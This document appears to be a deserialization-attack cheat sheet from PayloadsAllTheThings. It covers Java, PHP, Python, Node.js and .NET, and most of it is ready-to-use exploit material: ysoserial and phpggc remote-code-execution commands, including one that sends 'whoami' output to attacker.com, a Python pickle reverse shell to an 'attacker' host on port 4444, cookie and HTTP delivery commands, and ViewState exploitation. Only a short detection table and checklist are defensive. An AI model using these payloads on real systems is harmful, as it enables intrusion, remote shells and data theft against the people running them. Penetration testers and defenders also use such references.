# Insecure Deserialization Payloads

> Source: PayloadsAllTheThings — Insecure Deserialization

## Detection Signatures

| Language | Hex Header | Base64 Prefix |
|----------|-----------|---------------|
| Java     | `AC ED`   | `rO`          |
| PHP      | `O:`, `a:`, `s:`, `i:` | `Tz`   |
| Python   | `80 04 95` | `gASV`       |
| .NET     | —         | `AAEAAAD`     |
| Ruby     | `04 08`   | `BAgK`        |

## Java (ysoserial)

### Common Gadget Chains

```bash
# Commons Collections
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Commons Collections (various versions)
java -jar ysoserial.jar CommonsCollections3 'whoami'
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/$(whoami)'
java -jar ysoserial.jar CommonsCollections6 'ping -c 1 attacker.com'
java -jar ysoserial.jar CommonsCollections7 'id'

# Spring
java -jar ysoserial.jar Spring1 'touch /tmp/pwned'

# Hibernate
java -jar ysoserial.jar Hibernate1 'id'

# JBoss / JMX
java -jar ysoserial.jar JRMPClient 'attacker.com:1099'

# URLDNS (detection only, no RCE)
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'
```

### Delivery via HTTP

```bash
# POST serialized object
curl -X POST http://target/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# Via cookie (base64-encoded)
curl http://target/ -H "Cookie: session=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)"
```

### Detection

```bash
# Use URLDNS gadget (works with any Java app, no library dependency)
java -jar ysoserial.jar URLDNS 'http://xxxx.burpcollaborator.net' > detect.ser
```

## PHP (unserialize)

### Basic Object Injection

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"isAdmin";b:1;}
```

### Magic Methods Exploited

```
__wakeup()    — called on unserialize()
__destruct()  — called when object is destroyed
__toString()  — called when object is used as string
__call()      — called on undefined method
```

### RCE via POP Chain

```php
# phpggc — PHP Generic Gadget Chains
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec 'id'
phpggc Monolog/RCE1 exec 'id'
phpggc Guzzle/RCE1 exec id
phpggc Slim/RCE1 system id
phpggc Yii/RCE1 exec id
```

```bash
# Generate base64 payload
phpggc Laravel/RCE1 system 'id' -b

# Generate URL-encoded payload
phpggc Symfony/RCE4 exec 'cat /etc/passwd' -u
```

### Phar Deserialization

```bash
# Trigger via phar:// wrapper (no unserialize() call needed)
# Upload .phar file, then access via: phar://uploads/evil.phar/test
phpggc Monolog/RCE1 exec id -p phar -o evil.phar
```

## Python (pickle)

### Basic RCE

```python
import pickle
import os
import base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

### Reverse Shell

```python
import pickle
import os
import base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### PyYAML RCE

```yaml
# PyYAML < 6.0 with yaml.load() (unsafe loader)
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
```

## Node.js (node-serialize)

### RCE via IIFE

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

### Base64 Encoded

```javascript
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}';
var cookie = Buffer.from(serialize.serialize(payload)).toString('base64');
```

## .NET Deserialization

### ysoserial.net

```powershell
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami" -o base64

# ObjectStateFormatter (ViewState)
ysoserial.exe -g ActivitySurrogateSelector -f ObjectStateFormatter -c "whoami" -o base64

# LosFormatter
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc" -o base64

# Json.Net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "whoami"

# Common gadgets
TypeConfuseDelegate
WindowsIdentity
ActivitySurrogateSelector
PSObject
TextFormattingRunProperties
```

### ViewState Exploitation

```bash
# If machineKey is known
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "whoami" \
  --validationalg="SHA1" \
  --validationkey="KEY" \
  --generator="GENERATOR" \
  --viewstateuserkey="USERKEY" \
  --isdebug
```

## Detection Checklist

```
1. Identify serialized data in cookies, parameters, headers
2. Check Content-Type headers (application/x-java-serialized-object)
3. Look for base64 patterns matching known signatures
4. Test with URLDNS/DNS callback payloads first (safe detection)
5. Enumerate available libraries for gadget chain selection
```
